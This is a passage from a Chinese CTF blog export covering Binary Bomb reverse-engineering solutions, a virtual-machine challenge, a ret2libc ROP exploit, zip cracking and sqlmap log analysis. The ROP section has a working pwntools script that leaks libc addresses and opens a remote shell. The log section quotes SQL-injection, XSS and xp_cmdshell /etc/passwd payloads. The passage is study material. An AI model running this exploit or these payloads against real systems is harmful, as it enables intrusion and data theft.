[{"title":"304challenge","date":"2020-03-27T14:09:30.000Z","path":"2020-03-27/304challenge/","text":"一个简单的基于寄存器的的虚拟机，拥有自定义的字节码，可以解释执行任意一段与当前指令集相符的程序。 目标： 对虚拟机进行分析，理解其指令格式，取址方式，了解指令用法； 基于对虚拟机的理解写出对应的反汇编器； 对给出程序进行分析，理解hello程序所做的所有事情。初步理解：myvw对如何执行hello这个hex文件给出了解释执行的方法。静态分析myvw的运行方式确定其使用的指令集，并以之编写反汇编器，对hello进行反汇编，转换为用易于理解的助记符表示的汇编程序，从而理解其工作流程。初步探索通过myvm运行hello运行hello程序后会显示一行欢迎字符串，之后会要求输入一些数据，可以看到该程序的大致作用为将输入的数据回显出来，再输出一个换行。下面尝试一下奇怪的输入试探程序的一些特殊处理：键盘上的特殊键：输入了键盘上的”↑’键，可以看到程序并没有返回之前的几个字符，而是直接返回A，且并没有换行处理。使用010Editor查看文件&amp;&amp;使用IDA直接反汇编文件可以看到欢迎字符串存储在头部，不过对于这个未知的文件，指令与数据混杂在一起，无法确定代码和代码入口点的部分的位置，需要通过对myvw的分析来进一步确认。用IDA打开之后随便找了几个地方按c，可以得到一些汇编指令，但具体看不太明白，应该还是要从虚拟机入手。","tags":[{"name":"Virtual Machine","slug":"Virtual-Machine","permalink":"https://purewhitywhite.github.io/tags/Virtual-Machine/"}]},{"title":"Binary Bomb Phase6","date":"2020-03-24T16:27:04.000Z","path":"2020-03-25/Binary-Bomb-Phase6/","text":"Binary Bomb Phase6 writeup. Binary Bomb Phase6输入数字检验本部分是一个双层循环，分为两部分：检验输入数字是否都不大于6&amp;&amp;是否互不相等 是否不大于6123456.text:08048DCD mov esi, 0.text:08048DD2 mov eax, [esp+esi*4+4Ch+var_3C].text:08048DD6 sub eax, 1 ; Integer Subtraction.text:08048DD9 cmp eax, 5 ; Compare Two Operands.text:08048DDC jbe short loc_8048DE3 ; Jump if Below or Equal (CF=1 | ZF=1).text:08048DDE call explode_bomb ; Call Procedure 这部分通过esi检验了每个数字是否不大于6，满足条件跳转到下面： 是否互不相等12345678910111213.text:08048DE3 add esi, 1 ; Add.text:08048DE6 cmp esi, 6 ; Compare Two Operands.text:08048DE9 jnz short loc_8048DF2 ; Jump if Not Zero (ZF=0)…….text:08048DF2 mov ebx, esi.text:08048DF4 mov eax, [esp+ebx*4+4Ch+var_3C].text:08048DF8 cmp [esp+esi*4+4Ch+var_40], eax ; Compare Two Operands.text:08048DFC jnz short loc_8048E03 ; Jump if Not Zero (ZF=0).text:08048DFE call explode_bomb ; Call Procedure.text:08048E03 add ebx, 1 ; Add.text:08048E06 cmp ebx, 5 ; Compare Two Operands.text:08048E09 jle short loc_8048DF4 ; Jump if Less or Equal (ZF=1 | SF!=OF).text:08048E0B jmp short loc_8048DD2 ; Jump 这部分是双重循环的内层循环，作用为检验当前数字是否与其后剩下的（6-ebx）个数字互不相同。 按输入数字的顺序排列node大致思想是按照输入的数字序列的顺序存储node的地址 当前数字为11234567891011121314.text:08048DEB mov ebx, 0.text:08048DF0 jmp short loc_8048E2A ; Jump…….text:08048E2A mov esi, ebx.text:08048E2C mov ecx, [esp+ebx*4+4Ch+var_3C] ; .text:08048E30 cmp ecx, 1 ; Compare Two Operands.text:08048E33 jle short loc_8048E19 ; Jump if Less or Equal (ZF=1 | SF!=OF)// 判断当前读到数字是不是1，是1：.text:08048E19 mov edx, offset node1.text:08048E1E mov [esp+esi*4+4Ch+var_24], edx.text:08048E22 add ebx, 1 ; Add.text:08048E25 cmp ebx, 6 ; Compare Two Operands// 6个node都已经排好，跳出循环.text:08048E28 jz short loc_8048E41 ; Jump if Zero (ZF=1) 当前数字为1，那么就将node1的地址放在当前[esp+esi*4+4Ch+var_24]所表示的地方 当前数字不为1先看看node的结构：大致体现为一个单向链表的形式，存放着每个node的序号、指向的下一个节点的地址和一个数字。 1234567891011121314.text:08048E35 mov eax, 1.text:08048E3A mov edx, offset node1.text:08048E3F jmp short loc_8048E0D ; Jump…….text:08048E0D mov edx, [edx+8] .text:08048E10 add eax, 1 ; Add.text:08048E13 cmp eax, ecx ; Compare Two Operands.text:08048E15 jnz short loc_8048E0D ; Jump if Not Zero (ZF=0).text:08048E17 jmp short loc_8048E1E ; Jump.text:08048E1E mov [esp+esi*4+4Ch+var_24], edx.text:08048E22 add ebx, 1 ; Add.text:08048E25 cmp ebx, 6 ; Compare Two Operands// 6个node都已经排好，跳出循环.text:08048E28 jz short loc_8048E41 ; Jump if Zero (ZF=1) 本部分是双重循环的内循环，大致思想为找到当前数字对应的node，将这个node的地址按照当前数字在数列中的位次放在[esp+esi*4+4Ch+var_24]处。查看效果：每个node+8的位置存放着下个node的位置，所以使用mov edx, [edx+8]进行node切换。 修改node指向123456789101112.text:08048E41 mov ebx, [esp+4Ch+var_24].text:08048E45 lea eax, [esp+4Ch+var_20] ; Load Effective Address.text:08048E49 lea esi, [esp+4Ch+var_C] ; Load Effective Address.text:08048E4D mov ecx, ebx.text:08048E4F mov edx, [eax].text:08048E51 mov [ecx+8], edx.text:08048E54 add eax, 4 ; Add.text:08048E57 cmp eax, esi ; Compare Two Operands// 跳出循环.text:08048E59 jz short loc_8048E5F ; Jump if Zero (ZF=1).text:08048E5B mov ecx, edx.text:08048E5D jmp short loc_8048E4F ; Jump 这一部分中按照输入的数字的顺序将对应的每个node指向的下一个node的地址改为按照数字的顺序，而不是按node1→node2→node3……这样的顺序指向下一个node。查看修改后的效果（与第一张图片比较）： 判断是否从小到大12345678910111213.text:08048E5F mov dword ptr [edx+8], 0.text:08048E66 mov esi, 5.text:08048E6B mov eax, [ebx+8].text:08048E6E mov eax, [eax].text:08048E70 cmp [ebx], eax ; Compare Two Operands.text:08048E72 jle short loc_8048E79 ; Jump if Less or Equal (ZF=1 | SF!=OF).text:08048E74 call explode_bomb ; Call Procedure.text:08048E79 mov ebx, [ebx+8].text:08048E7C sub esi, 1 ; Integer Subtraction.text:08048E7F jnz short loc_8048E6B ; Jump if Not Zero (ZF=0).text:08048E84 pop ebx.text:08048E85 pop esi.text:08048E86 retn 在这一部分将每个node存储的第一个数字与该node指向的下一个node存储的第一个数字进行比较，整体上看是判断每个node是否按照其存储的第一个数字以从小到大的顺序进行链接，若满足该条件即可正常返回。注意到每个node存储的第一个数字为：0xd5 0x6c 0x10c 0x392 0xf4 0x307，即可确定输入的序列：2 1 5 3 6 4","tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"}]},{"title":"Binary Bomb Phase5","date":"2020-03-24T08:31:11.000Z","path":"2020-03-24/Binary-Bomb-Phase5/","text":"Binary Bomb Phase5 writeup. Binary Bomb Phase5获取字符串部分123456.text:08048D6F mov ebx, [esp+1Ch+arg_0].text:08048D73 mov [esp+1Ch+var_1C], ebx.text:08048D76 call string_length ; Call Procedure.text:08048D7B cmp eax, 6 ; Compare Two Operands.text:08048D7E jz short loc_8048D85 ; Jump if Zero (ZF=1).text:08048D80 call explode_bomb ; Call Procedure 这部分的目的是验证输入的字符串长度是否为6，不为6则会爆炸。 逐字符判断1234567891011.text:08048D85 mov edx, 0.text:08048D8A mov eax, 0.text:08048D8F movzx ecx, byte ptr [ebx+eax] ; Move with Zero-Extend.text:08048D93 and ecx, 0Fh ; Logical AND.text:08048D96 add edx, ds:array_3141[ecx*4] ; Add.text:08048D9D add eax, 1 ; Add.text:08048DA0 cmp eax, 6 ; Compare Two Operands.text:08048DA3 jnz short loc_8048D8F ; Jump if Not Zero (ZF=0).text:08048DA5 cmp edx, 2Ah ; Compare Two Operands.text:08048DA8 jz short loc_8048DAF ; Jump if Zero (ZF=1).text:08048DAA call explode_bomb ; Call Procedure 这部分先逐字符以ascii码的形式存入ecx，and ecx, 0Fh使得读入字符的高4位为零，效果如下： MOVZX指令（进行全零扩展并传送）用于无符号整数，将源操作数复制到目的操作数，并把目的操作数 0 扩展到 16 位或 32 位。此处源操作数是1byte=8bit，ecx大小是32bit，此处的用意应该是将目的操作数扩展至ecx大小。 之后将在ds:array_3141[ecx*4]这个数组所在的位置查到的值累加入edx，六次循环读完所有字符后将edx中的值与2Ah进行比较，若相等则可以正常返回。 查看数组存放内容 可以看到输入的字符串的每个字符的ascii码的低四位分别对应了一个数组的值，于是可知通关的条件是找到这样六个字符，使得以每个字符对应的ascii码的低四位作为数组下标对应的值和为42。答案不唯一，由于i的ascii为0x69，低四位为9，乘4后对应的数组的值为7,6*7即可凑成42，那么答案之一可为iiiiii。","tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"}]},{"title":"Binary Bomb Phase4","date":"2020-03-23T05:57:03.000Z","path":"2020-03-23/Binary-Bomb-Phase4/","text":"Binary Bomb Phase4 writeup. Binary Bomb Phase4获取数据部分跟上一关一样，读入两个数字，不赘述 参数大小判断1234.text:08048D37 mov eax, [esp+2Ch+var_14].text:08048D3B sub eax, 2.text:08048D3E cmp eax, 2.text:08048D41 jbe short loc_8048D48 在这一部分中判断了输入的第二个参数是否小于等于4。若大于4则爆炸。 func4123456.text:08048D48 mov eax, [esp+2Ch+var_14].text:08048D4C mov [esp+2Ch+var_28], eax.text:08048D50 mov [esp+2Ch+var_2C], 8.text:08048D57 call func4.text:08048D5C cmp eax, [esp+2Ch+var_10].text:08048D60 jz short loc_8048D67 这部分先为func4设置了变量，第一个变量为8，第二个变量为输入的第二个数字。调用func4后注意到将放在eax中的返回值与输入的第一个数字进行比较，若相等则可以正常返回。以func4的参数是（8,4）为例，nexti运行到cmp eax, [esp+2Ch+var_10]指令后info regis查看eax中的值：查看效果： 结合IDA反编译结果分析func4的汇编指令： 123456789101112131415int __cdecl func4(int a1, int a2)&#123; int result; // eax int v3; // edi if ( a1 &lt;= 0 ) return 0; result = a2; if ( a1 != 1 ) &#123; v3 = func4(a1 - 1, a2) + a2; result = v3 + func4(a1 - 2, a2); &#125; return result;&#125; 1234567891011121314151617181920212223242526272829303132.text:08048CC1 var_1C = dword ptr -1Ch.text:08048CC1 var_18 = dword ptr -18h.text:08048CC1 arg_0 = dword ptr 4.text:08048CC1 arg_4 = dword ptr 8.text:08048CC1 push edi.text:08048CC2 push esi.text:08048CC3 push ebx.text:08048CC4 sub esp, 10h.text:08048CC7 mov ebx, [esp+1Ch+arg_0].text:08048CCB mov esi, [esp+1Ch+arg_4].text:08048CCF test ebx, ebx.text:08048CD1 jle short loc_8048CFF //即if ( a1 &lt;= 0 ) return 0;.text:08048CD3 mov eax, esi//result=a2.text:08048CD5 cmp ebx, 1.text:08048CD8 jz short loc_8048D04 //即if ( a1 != 1 ).text:08048CDA mov [esp+1Ch+var_18], esi.text:08048CDE lea eax, [ebx-1].text:08048CE1 mov [esp+1Ch+var_1C], eax.text:08048CE4 call func4 //即func4(a1-1,a2).text:08048CE9 lea edi, [eax+esi] //edi即v3，v3=func4(a1 - 1, a2) + a2.text:08048CEC mov [esp+1Ch+var_18], esi.text:08048CF0 sub ebx, 2.text:08048CF3 mov [esp+1Ch+var_1C], ebx.text:08048CF6 call func4 //即func4(a1-2,a2).text:08048CFB add eax, edi //return v3+func4(a1 - 2, a2).text:08048CFD jmp short loc_8048D04.text:08048CFF mov eax, 0.text:08048D04 add esp, 10h.text:08048D07 pop ebx.text:08048D08 pop esi.text:08048D09 pop edi.text:08048D0A retn 计算答案12345678910111213def func4(a1, a2): result = 0 v3 = 0 if a1 &lt;= 0: return 0 result = a2 if a1 != 1: v3 = func4(a1-1, a2) + a2 result = v3 + func4(a1-2, a2) return resultprint(func4(8, 4))","tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"}]},{"title":"Binary Bomb Phase3","date":"2020-03-22T14:15:40.000Z","path":"2020-03-22/Binary-Bomb-Phase3/","text":"Binary Bomb Phase3 writeup. Binary Bomb Phase3获取数据123456789101112131415161718192021222324.text:08048C02 public phase_3.text:08048C02 phase_3 proc near ; CODE XREF: main+F6↑p.text:08048C02.text:08048C02 var_2C = dword ptr -2Ch.text:08048C02 var_28 = dword ptr -28h.text:08048C02 var_24 = dword ptr -24h.text:08048C02 var_20 = dword ptr -20h.text:08048C02 var_14 = dword ptr -14h.text:08048C02 var_10 = dword ptr -10h.text:08048C02 arg_0 = dword ptr 4.text:08048C02.text:08048C02 ; __unwind &#123;.text:08048C02 sub esp, 2Ch.text:08048C05 lea eax, [esp+2Ch+var_10].text:08048C09 mov [esp+2Ch+var_20], eax.text:08048C0D lea eax, [esp+2Ch+var_14].text:08048C11 mov [esp+2Ch+var_24], eax.text:08048C15 mov [esp+2Ch+var_28], offset aDD ; \"%d %d\".text:08048C1D mov eax, [esp+2Ch+arg_0].text:08048C21 mov [esp+2Ch+var_2C], eax.text:08048C24 call ___isoc99_sscanf.text:08048C29 cmp eax, 1.text:08048C2C jg short loc_8048C33.text:08048C2E call explode_bomb 同上一关一样使用了sscanf函数，具体形式为__isoc99_sscanf( 输入的字符串, &quot;%d %d&quot;, &amp;v9, &amp;v10)，可知本关要求输入两个数字，最后对输入数字个数进行判断，若大于1个就继续向下。 Switch跳转计算1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980.text:08048C33.text:08048C33 loc_8048C33: ; CODE XREF: phase_3+2A↑j.text:08048C33 cmp [esp+2Ch+var_14], 7 ; switch 8 cases.text:08048C38 ja short loc_8048CA0 ; jumptable 08048C3E default case.text:08048C3A mov eax, [esp+2Ch+var_14].text:08048C3E jmp ds:off_804A180[eax*4] ; switch jump.text:08048C45 ; ---------------------------------------------------------------------------.text:08048C45.text:08048C45 loc_8048C45: ; CODE XREF: phase_3+3C↑j.text:08048C45 ; DATA XREF: .rodata:off_804A180↓o.text:08048C45 mov eax, 0 ; jumptable 08048C3E case 1.text:08048C4A jmp short loc_8048C51.text:08048C4C ; ---------------------------------------------------------------------------.text:08048C4C.text:08048C4C loc_8048C4C: ; CODE XREF: phase_3+3C↑j.text:08048C4C ; DATA XREF: .rodata:off_804A180↓o.text:08048C4C mov eax, 455 ; jumptable 08048C3E case 0.text:08048C51.text:08048C51 loc_8048C51: ; CODE XREF: phase_3+48↑j.text:08048C51 sub eax, 356.text:08048C56 jmp short loc_8048C5D.text:08048C58 ; ---------------------------------------------------------------------------.text:08048C58.text:08048C58 loc_8048C58: ; CODE XREF: phase_3+3C↑j.text:08048C58 ; DATA XREF: .rodata:off_804A180↓o.text:08048C58 mov eax, 0 ; jumptable 08048C3E case 2.text:08048C5D.text:08048C5D loc_8048C5D: ; CODE XREF: phase_3+54↑j.text:08048C5D add eax, 692.text:08048C62 jmp short loc_8048C69.text:08048C64 ; ---------------------------------------------------------------------------.text:08048C64.text:08048C64 loc_8048C64: ; CODE XREF: phase_3+3C↑j.text:08048C64 ; DATA XREF: .rodata:off_804A180↓o.text:08048C64 mov eax, 0 ; jumptable 08048C3E case 3.text:08048C69.text:08048C69 loc_8048C69: ; CODE XREF: phase_3+60↑j.text:08048C69 sub eax, 389.text:08048C6E jmp short loc_8048C75.text:08048C70 ; ---------------------------------------------------------------------------.text:08048C70.text:08048C70 loc_8048C70: ; CODE XREF: phase_3+3C↑j.text:08048C70 ; DATA XREF: .rodata:off_804A180↓o.text:08048C70 mov eax, 0 ; jumptable 08048C3E case 4.text:08048C75.text:08048C75 loc_8048C75: ; CODE XREF: phase_3+6C↑j.text:08048C75 add eax, 389.text:08048C7A jmp short loc_8048C81.text:08048C7C ; ---------------------------------------------------------------------------.text:08048C7C.text:08048C7C loc_8048C7C: ; CODE XREF: phase_3+3C↑j.text:08048C7C ; DATA XREF: .rodata:off_804A180↓o.text:08048C7C mov eax, 0 ; jumptable 08048C3E case 5.text:08048C81.text:08048C81 loc_8048C81: ; CODE XREF: phase_3+78↑j.text:08048C81 sub eax, 389.text:08048C86 jmp short loc_8048C8D.text:08048C88 ; ---------------------------------------------------------------------------.text:08048C88.text:08048C88 loc_8048C88: ; CODE XREF: phase_3+3C↑j.text:08048C88 ; DATA XREF: .rodata:off_804A180↓o.text:08048C88 mov eax, 0 ; jumptable 08048C3E case 6.text:08048C8D.text:08048C8D loc_8048C8D: ; CODE XREF: phase_3+84↑j.text:08048C8D add eax, 389.text:08048C92 jmp short loc_8048C99.text:08048C94 ; ---------------------------------------------------------------------------.text:08048C94.text:08048C94 loc_8048C94: ; CODE XREF: phase_3+3C↑j.text:08048C94 ; DATA XREF: .rodata:off_804A180↓o.text:08048C94 mov eax, 0 ; jumptable 08048C3E case 7.text:08048C99.text:08048C99 loc_8048C99: ; CODE XREF: phase_3+90↑j.text:08048C99 sub eax, 389.text:08048C9E jmp short loc_8048CAA.text:08048CA0 ; ---------------------------------------------------------------------------.text:08048CA0.text:08048CA0 loc_8048CA0: ; CODE XREF: phase_3+36↑j.text:08048CA0 call explode_bomb ; jumptable 08048C3E default case.text:08048CA5 mov eax, 0 首先判断第一个变量是否小于等于7，若不小于7则爆炸。 12mov eax, [esp+2Ch+var_14]jmp ds:off_804A180[eax*4] 这两句语句是实现switch跳转的关键：先将第一个参数读入eax，然后在0x804A180处根据eax的值查询switch的jump table： 12345678.rodata:0804A180 off_804A180 dd offset loc_8048C4C ; DATA XREF: phase_3+3C↑r.rodata:0804A180 dd offset loc_8048C45 ; jump table for switch statement.rodata:0804A180 dd offset loc_8048C58.rodata:0804A180 dd offset loc_8048C64.rodata:0804A180 dd offset loc_8048C70.rodata:0804A180 dd offset loc_8048C7C.rodata:0804A180 dd offset loc_8048C88.rodata:0804A180 dd offset loc_8048C94 以输入的第一个字符为0为例，eax经过了+455，-356，+692，-389，+389，-389，+389，-389一系列的操作之后得到结果402。 验证变量1234567891011121314151617.text:08048CAA.text:08048CAA loc_8048CAA: ; CODE XREF: phase_3+9C↑j.text:08048CAA cmp [esp+2Ch+var_14], 5.text:08048CAF jg short loc_8048CB7.text:08048CB1 cmp eax, [esp+2Ch+var_10].text:08048CB5 jz short loc_8048CBC.text:08048CB7.text:08048CB7 loc_8048CB7: ; CODE XREF: phase_3+AD↑j.text:08048CB7 call explode_bomb.text:08048CBC ; ---------------------------------------------------------------------------.text:08048CBC.text:08048CBC loc_8048CBC: ; CODE XREF: phase_3+B3↑j.text:08048CBC add esp, 2Ch.text:08048CBF nop.text:08048CC0 retn.text:08048CC0 ; &#125; // starts at 8048C02.text:08048CC0 phase_3 endp 将输入的第一个数字与5比较，若小于等于5则不引爆炸弹继续向下，之后将eax中的值（即计算后的结果，402）与第二个参数比较，若相等则可以正常返回。总结，本关的第一个数字共有5种可能的值，分别是0,1,2,3,4,5，然后可以根据switch的条件分支找到对应的第二个数字的值。 验证判断","tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"}]},{"title":"Binary Bomb Phase2","date":"2020-03-21T14:17:24.000Z","path":"2020-03-21/Binary-Bomb-Phase2/","text":"Binary Bomb Phase2 writeup. Binary Bomb Phase2获取数据部分12345678910111213141516171819202122int __cdecl phase_2(int a1)&#123; int result; // eax char *v2; // ebx int v3; // [esp+18h] [ebp-24h] char v4; // [esp+1Ch] [ebp-20h] char v5; // [esp+30h] [ebp-Ch] read_six_numbers(a1, (int)&amp;v3); if ( v3 != 1 ) explode_bomb(); v2 = &amp;v4; do &#123; result = 2 * *((_DWORD *)v2 - 1); if ( *(_DWORD *)v2 != result ) explode_bomb(); v2 += 4; &#125; while ( v2 != &amp;v5 ); return result;&#125; read_six_numbers(): 123456789int __cdecl read_six_numbers(int a1, int a2)&#123; int result; // eax result = __isoc99_sscanf(a1, (const char *)&amp;unk_804A2E3, a2, a2 + 4, a2 + 8, a2 + 12, a2 + 16, a2 + 20); if ( result &lt;= 5 ) explode_bomb(); return result;&#125; 有一大堆莫名其妙的变量，能理解的部分是read_six_numbers的处理，其中关键在于sscanf()的理解。先看看该函数的定义： 了解到a1即为将被处理的字符串，该字符串将被按照unk_804A2E3处存储的规则处理，结果放在v3所对应的位置上，返回值为成功匹配到的数字个数。看一下unk_804A2E3处对于输入字符串的处理规则： %d %d %d %d %d %d，说明我们要输入的是6个数字，就和函数名对应起来了。接下来if ( v3 != 1 )判断输入的第一个数字是否为1，若不是则会爆炸。之后过程IDA解释得不甚合理，转向查看汇编指令。 循环判断部分12345678910111213141516170x08048bd9 &lt;+37&gt;: jmp 0x8048bf2 &lt;phase_2+62&gt;0x08048bdb &lt;+39&gt;: mov eax,DWORD PTR [ebx-0x4]0x08048bde &lt;+42&gt;: add eax,eax0x08048be0 &lt;+44&gt;: cmp DWORD PTR [ebx],eax0x08048be2 &lt;+46&gt;: je 0x8048be9 &lt;phase_2+53&gt;0x08048be4 &lt;+48&gt;: call 0x80490f5 &lt;explode_bomb&gt;0x08048be9 &lt;+53&gt;: add ebx,0x40x08048bec &lt;+56&gt;: cmp ebx,esi0x08048bee &lt;+58&gt;: jne 0x8048bdb &lt;phase_2+39&gt;0x08048bf0 &lt;+60&gt;: jmp 0x8048bfc &lt;phase_2+72&gt;0x08048bf2 &lt;+62&gt;: lea ebx,[esp+0x1c]0x08048bf6 &lt;+66&gt;: lea esi,[esp+0x30]0x08048bfa &lt;+70&gt;: jmp 0x8048bdb &lt;phase_2+39&gt;0x08048bfc &lt;+72&gt;: add esp,0x340x08048bff &lt;+75&gt;: pop ebx0x08048c00 &lt;+76&gt;: pop esi0x08048c01 &lt;+77&gt;: ret 大致思想是这样的：ebx作为遍历数组的指针，每指到一个数将其存入eax，并将eax*2的结果与下一个数相比较，若相等则再指向下一个数；若不相等即引爆炸弹。判断后，ebx与存储着数组边界的esi进行比较，如果不相等，即继续循环；若相等（且过程中没有call炸弹爆炸）则正常ret。根据以上的分析可知，ssanf读到的数组应该是初值为1，倍数为2，个数为6个的等比数列，即[1,2,4,8,16,32]。使用gdb info regis查看寄存器的值验证判断：第一次循环，eax=1 add eax,eax add ebx,0x4","tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"}]},{"title":"Binary Bomb Phase1","date":"2020-03-20T14:27:04.000Z","path":"2020-03-20/Binary-Bomb-Phase1/","text":"Binary Bomb Phase1 writeup. 大概了解了一下，这应该是类似于逆向的题目吧，解题的关键在于找到密码生成的方法，或者修改汇编程序绕过密码验证。 使用gdb *filename*启动gdb后使用gdb l查看源代码： 可见phase_1就是阶段一的入口点，在此设置断点：gdb b phase_1后运行程序gdb r： 输入一些内容后按回车键回到gdb，查看汇编代码gdb disassemb： 这段汇编代码的大致含义：开辟栈空间，将0x804a124处的数据移入[esp+4]的位置，将esp+20处的数据（应该是输入的字符串作为参数）移到eax中，将eax中的值放入栈顶，请求strings_not_equal函数，根据返回值（eax）的值是否为0，从而决定是否引爆炸弹。查看0x804a124处的数据(s:以字符串形式输出)：gdb x/s 0x804a124 于是知道了破解phase1的密码I am the mayor. I can do anything I want.，测试： AT&amp;T太辣眼睛？：set disassembly-flavor intel AT&amp;T和Inter区别 跳转指令集合","tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"}]},{"title":"Stage1Day11 pwn&Misc","date":"2020-03-18T12:19:18.000Z","path":"2020-03-18/Stage1Day11-pwn-Misc/","text":"Blue-whale OJROP、birthday writeup. ROP(Return Oriented Programming)随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件: 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。reference查看文件&amp;保护机制&amp;system&amp;/bin/sh 动态链接的32位ELF文件，开启了NX保护，不能执行栈中的shellcode了。找不到system和/bin/sh，尝试在其动态链接库中查找。 反汇编1234567ssize_t sub_80484EA()&#123; char buf; // [esp+0h] [ebp-58h] puts(\"welcome to ROP world\"); return read(0, &amp;buf, 0xC8u);&#125; 可以看到buf的大小为58h，读入C8h字节数据，存在栈溢出。由于system函数的地址位置，同时属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。所以如果我们知道 libc中某个函数的地址，那么我们就可以确定该程序利用的 libc版本。进而我们就可以知道 system 函数的地址。由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。注意到在read函数之前执行过puts()，所以我们就通过泄露puts()的地址获得libc的版本。reference 获得puts地址12345678910111213from pwn import *from LibcSearcher import LibcSearcherr = remote('vps1.blue-whale.me', 9991)pwn2 = ELF('./pwn2')puts_plt = pwn2.plt['puts']puts_got = pwn2.got['puts']# entry = pwn2.symbols['sub_80484EA']entry = 0x08048519payload1 = 'a'*92 + p32(puts_plt) + p32(entry) + p32(puts_got)r.recvuntil(\"welcome to ROP world\\n\")r.sendline(payload1)puts_addr = u32(r.recv()[0:4])print hex(puts_addr) 问题：第三行为什么要获取main的地址？而不是调用puts()的sub_80484EA()的地址？这个payload的原理到底是什么？ 由puts的地址推导出system和/bin/sh的地址123456789101112# libc = LibcSearcher('puts', puts_addr)'''libcbase = puts_addr - libc.dump('puts')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')'''libc = ELF('./libc.so.6')putslibc = libc.symbols['puts']libcbase = puts_addr - putslibcsyslibc=libc.symbols['system']system_addr = libcbase + syslibcbinsh_addr = libcbase + next(libc.search('/bin/sh')) 使用LibcSearcher显示No matched libc, please add more libc or try others怎么办？使用ldd filename查看ELF文件依赖的动态库，然后手动添加即可 1234# getshellpayload2 = 'a'*92 + p32(system_addr) + 'a'*4 + p32(binsh_addr)r.sendline(payload2)r.interactive() 对于rec2libc的原理掌握得还很不到位，本文将继续更新 Birthday使用Advanced Zip Password Recovery打开，选择暴力破解模式，设置密码形式为全数字all-digit，起始值为19900101，点击start即可破解得到密码。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"pwn","slug":"pwn","permalink":"https://purewhitywhite.github.io/tags/pwn/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day10 Misc","date":"2020-03-17T15:05:09.000Z","path":"2020-03-17/Stage1Day10-Misc/","text":"Log writeup. URL解码打开access.log文件可以看到这是一份被sqlmap扫描过的主机的日志文件，先url解码提高可读性： 12345from urllib import parselog = open('access.log', 'r')f = open('output.txt', 'w')for i in log.readlines(): f.write(parse.unquote(i)) 观察解码后的文件： 12345678192.168.247.129 - - [24/Dec/2017:08:21:17 +0000] &quot;GET /?username=admin&amp;password=b HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:17 +0000] &quot;GET /?username=admin&amp;password=b&amp;wcDa=2205 AND 1=1 UNION ALL SELECT 1,NULL,&apos;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&apos;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(&apos;cat ../../../etc/passwd&apos;)# HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:18 +0000] &quot;GET /?username=admin&amp;password=b HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:18 +0000] &quot;GET /?username=2754&amp;password=b HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:18 +0000] &quot;GET /?username=admin&apos;,.((&quot;.),.&amp;password=b HTTP/1.1&quot; 200 182 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;……………… 日志分析一开始没看出啥所以然，拖到最后看到了熟悉的二分法盲注 1234567192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;64) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;96) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;112) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 182 